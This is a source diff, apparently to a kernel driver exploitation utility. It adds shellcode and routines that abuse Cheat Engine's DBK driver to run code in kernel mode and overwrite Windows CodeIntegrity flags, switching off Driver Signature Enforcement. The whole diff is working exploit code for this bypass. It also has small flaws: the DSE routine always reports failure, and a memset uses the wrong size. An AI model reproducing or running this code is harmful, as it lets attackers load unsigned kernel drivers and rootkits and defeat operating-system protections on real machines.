@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.20
 *
-*  DATE:        10 Feb 2022
+*  DATE:        14 Feb 2022
 *
 *  Cheat Engine's DBK driver routines.
 *
@@ -31,6 +31,106 @@
 #define DBK_DEVICE_LINK L"\\DosDevices\\CEDRIVER73"
 #define DBK_PROCESS_LIST L"\\BaseNamedObjects\\DBKProcList60"
 #define DBK_THREAD_LIST L"\\BaseNamedObjects\\DBKThreadList60"
+
+#define DBK_INIT_CODE_SIZE 16
+#define DBK_SC_MAX_SIZE PAGE_SIZE
+#define DBK_SHELLCODE_CI_PAYLOAD_SIZE DBK_SC_MAX_SIZE -\
+    DBK_INIT_CODE_SIZE - \
+    sizeof(PVOID) - \
+    sizeof(ULONG_PTR)
+
+typedef struct _DBK_SHELLCODE_CI {
+    BYTE InitCode[DBK_INIT_CODE_SIZE];
+    BYTE Payload[DBK_SHELLCODE_CI_PAYLOAD_SIZE];
+    PULONG_PTR AddressOfVariable;
+    ULONG_PTR ValueToWrite;
+} DBK_SHELLCODE_CI, * PDBK_SHELLCODE_CI;
+
+/*
+* DbkDsePatchRoutine
+*
+* Purpose:
+*
+* DSE patch to be executed in kernel mode.
+*
+*/
+VOID WINAPI DbkDsePatchRoutine(
+    _In_ PDBK_SHELLCODE_CI ShellCode
+)
+{
+    *ShellCode->AddressOfVariable = ShellCode->ValueToWrite;
+}
+
+/*
+* DbkpBuildShellCode
+*
+* Purpose:
+*
+* DSE patch code construction.
+*
+*/
+BOOL DbkpBuildShellCodeDsePatch(
+    _In_ PDBK_SHELLCODE_CI ShellCode,
+    _In_ ULONG_PTR Address,
+    _In_ ULONG_PTR Value
+)
+{
+    ULONG procSize, maxSize;
+
+    procSize = ScSizeOfProc((BYTE*)DbkDsePatchRoutine);
+    maxSize = DBK_SHELLCODE_CI_PAYLOAD_SIZE;
+
+    if (procSize > maxSize) {
+        supPrintfEvent(kduEventError,
+            "[!] Bootstrap code size 0x%lX exceeds limit 0x%lX, abort\r\n",
+            procSize,
+            maxSize);
+
+#ifndef _DEBUG
+        return FALSE;
+#endif
+    }
+
+    memcpy(ShellCode->Payload, DbkDsePatchRoutine, procSize);
+
+    memset(ShellCode->InitCode, 0xCC, sizeof(DBK_INIT_CODE_SIZE));
+
+    // 00 call +5
+    // 05 pop rcx
+    // 06 sub rcx, 5
+    // 0A jmps 10 
+    // 0B int 3
+    // 0C int 3
+    // 0D int 3
+    // 0E int 3
+    // 0F int 3
+    // 10 code
+
+    //call +5
+    ShellCode->InitCode[0x0] = 0xE8;
+    ShellCode->InitCode[0x1] = 0x00;
+    ShellCode->InitCode[0x2] = 0x00;
+    ShellCode->InitCode[0x3] = 0x00;
+    ShellCode->InitCode[0x4] = 0x00;
+
+    //pop rcx
+    ShellCode->InitCode[0x5] = 0x59;
+
+    //sub rcx, 5
+    ShellCode->InitCode[0x6] = 0x48;
+    ShellCode->InitCode[0x7] = 0x83;
+    ShellCode->InitCode[0x8] = 0xE9;
+    ShellCode->InitCode[0x9] = 0x05;
+
+    // jmps 
+    ShellCode->InitCode[0xA] = 0xEB;
+    ShellCode->InitCode[0xB] = 0x04;
+
+    ShellCode->AddressOfVariable = (PULONG_PTR)Address;
+    ShellCode->ValueToWrite = Value;
+
+    return TRUE;
+}
 
 /*
 * DbkSetupCheatEngineObjectNames
@@ -306,13 +406,13 @@ BOOL DbkStartVulnerableDriver(
 
     if (bLoaded) {
 
-        printf_s("[+] Acquiring handle for driver device \"%ws\" -> please wait, this can take a few seconds\r\n", 
+        printf_s("[+] Acquiring handle for driver device \"%ws\" -> please wait, this can take a few seconds\r\n",
             Context->Provider->DeviceName);
 
         if (DbkOpenCheatEngineDriver(Context)) {
 
             supPrintfEvent(kduEventInformation,
-                "[+] Successfully acquired handle for driver device \"%ws\"\r\n", 
+                "[+] Successfully acquired handle for driver device \"%ws\"\r\n",
                 Context->Provider->DeviceName);
 
         }
@@ -518,6 +618,98 @@ BOOL DbkpExecuteCodeAtAddress(
 }
 
 /*
+* DbkpMapAndExecuteCode
+*
+* Purpose:
+*
+* Allocate page for shellcode, map it and execute.
+*
+*/
+BOOL DbkpMapAndExecuteCode(
+    _In_ PKDU_CONTEXT Context,
+    _In_ PVOID ShellCode,
+    _In_ ULONG SizeOfShellCode,
+    _In_ BOOLEAN ShowResult,
+    _In_opt_ HANDLE ReadyEventHandle,
+    _In_opt_ HANDLE SectionHandle
+)
+{
+    BOOL bSuccess = FALSE;
+    HANDLE deviceHandle = Context->DeviceHandle;
+
+    PVOID pvPage = DbkpAllocateNonPagedMemory(deviceHandle, PAGE_SIZE);
+
+    if (pvPage) {
+
+        printf_s("[+] NonPagedPool memory allocated at 0x%p\r\n", pvPage);
+
+        PVOID mdl = NULL, ptr = NULL;
+
+        ptr = DbkpMapMemorySelf(deviceHandle, pvPage, PAGE_SIZE, &mdl);
+        if (ptr && mdl) {
+
+            printf_s("[+] Mdl allocated at 0x%p\r\n", mdl);
+            printf_s("[+] Memory mapped at 0x%p\r\n", ptr);
+
+            RtlCopyMemory(ptr,
+                ShellCode,
+                SizeOfShellCode);
+
+            DbkpUnmapMemorySelf(deviceHandle, ptr, mdl);
+
+            printf_s("[+] Executing code at 0x%p\r\n", pvPage);
+
+            bSuccess = DbkpExecuteCodeAtAddress(deviceHandle, pvPage);
+
+            if (bSuccess) {
+
+                printf_s("[+] Code executed successfully\r\n");
+
+                if (ShowResult &&
+                    ReadyEventHandle &&
+                    SectionHandle)
+                {
+
+                    //
+                    // Wait for the shellcode to trigger the event
+                    //
+                    if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
+
+                        supPrintfEvent(kduEventError,
+                            "[!] Shellcode did not trigger the event within two seconds.\r\n");
+
+                        bSuccess = FALSE;
+                    }
+                    else
+                    {
+
+                        KDUShowPayloadResult(Context, SectionHandle);
+                    }
+                }
+
+            }
+            else {
+                supPrintfEvent(kduEventError,
+                    "[!] Could not execute code, GetLastError %lu\r\n", GetLastError());
+            }
+
+        }
+        else {
+            supPrintfEvent(kduEventError,
+                "[!] Could not map memory, GetLastError %lu\r\n", GetLastError());
+        }
+
+        DbkpFreeMemory(deviceHandle, pvPage);
+    }
+    else {
+        supPrintfEvent(kduEventError,
+            "[!] Could not allocate nonpaged memory, GetLastError %lu\r\n", GetLastError());
+    }
+
+    return bSuccess;
+}
+
+/*
 * DbkMapDriver
 *
 * Purpose:
@@ -547,64 +739,12 @@ BOOL DbkMapDriver(
         HANDLE readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
         if (readyEventHandle) {
 
-            PVOID pvPage = DbkpAllocateNonPagedMemory(deviceHandle, PAGE_SIZE);
-
-            if (pvPage) {
-
-                printf_s("[+] NonPagedPool memory allocated at 0x%p\r\n", pvPage);
-
-                PVOID mdl = NULL, ptr = NULL;
-
-                ptr = DbkpMapMemorySelf(deviceHandle, pvPage, PAGE_SIZE, &mdl);
-                if (ptr && mdl) {
-
-                    printf_s("[+] Mdl allocated at 0x%p\r\n", mdl);
-                    printf_s("[+] Memory mapped at 0x%p\r\n", ptr);
-
-                    RtlCopyMemory(ptr,
-                        pvShellCode,
-                        ScSizeOf(Context->ShellVersion, NULL));
-
-                    DbkpUnmapMemorySelf(deviceHandle, ptr, mdl);
-
-                    printf_s("[+] Executing code at 0x%p\r\n", pvPage);
-
-                    if (DbkpExecuteCodeAtAddress(deviceHandle, pvPage)) {
-                        printf_s("[+] Code executed successfully\r\n");
-
-                        //
-                        // Wait for the shellcode to trigger the event
-                        //
-                        if (WaitForSingleObject(readyEventHandle, 2000) != WAIT_OBJECT_0) {
-
-                            supPrintfEvent(kduEventError,
-                                "[!] Shellcode did not trigger the event within two seconds.\r\n");
-
-                            bSuccess = FALSE;
-                        }
-                        else
-                        {
-                            KDUShowPayloadResult(Context, sectionHandle);
-                        }
-
-                    }
-                    else {
-                        supPrintfEvent(kduEventError,
-                            "[!] Could not execute code, GetLastError %lu\r\n", GetLastError());
-                    }
-
-                }
-                else {
-                    supPrintfEvent(kduEventError,
-                        "[!] Could not map memory, GetLastError %lu\r\n", GetLastError());
-                }
-
-                DbkpFreeMemory(Context->DeviceHandle, pvPage);
-            }
-            else {
-                supPrintfEvent(kduEventError,
-                    "[!] Could not allocate nonpaged memory, GetLastError %lu\r\n", GetLastError());
-            }
+            DbkpMapAndExecuteCode(Context,
+                pvShellCode,
+                ScSizeOf(Context->ShellVersion, NULL),
+                TRUE,
+                readyEventHandle,
+                sectionHandle);
 
             CloseHandle(readyEventHandle);
 
@@ -633,4 +773,62 @@ BOOL DbkMapDriver(
     FUNCTION_LEAVE_MSG(__FUNCTION__);
 
     return bSuccess;
+}
+
+/*
+* DbkControlDSE
+*
+* Purpose:
+*
+* Change Windows CodeIntegrity flags state via Dbk driver.
+*
+*/
+BOOL DbkControlDSE(
+    _In_ PKDU_CONTEXT Context,
+    _In_ ULONG DSEValue,
+    _In_ ULONG_PTR Address
+)
+{
+    BOOL bResult = FALSE;
+    DBK_SHELLCODE_CI* pvShellCode;
+
+    FUNCTION_ENTER_MSG(__FUNCTION__);
+
+    pvShellCode = (DBK_SHELLCODE_CI*)VirtualAlloc(NULL, sizeof(DBK_SHELLCODE_CI),
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    if (pvShellCode) {
+
+        if (DbkpBuildShellCodeDsePatch(pvShellCode, Address, DSEValue)) {
+
+            printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
+                (PVOID)Address,
+                DSEValue);
+
+            if (DbkpMapAndExecuteCode(Context,
+                pvShellCode,
+                sizeof(DBK_SHELLCODE_CI),
+                FALSE,
+                NULL,
+                NULL))
+            {
+                supPrintfEvent(kduEventInformation,
+                    "[+] DSE patch executed successfully\r\n");
+            }
+
+        }
+        else {
+
+            supPrintfEvent(kduEventError,
+                "[!] Error while building shellcode, abort\r\n");
+
+        }
+
+        VirtualFree(pvShellCode, 0, MEM_RELEASE);
+    }
+
+    FUNCTION_LEAVE_MSG(__FUNCTION__);
+
+    return bResult;
 }
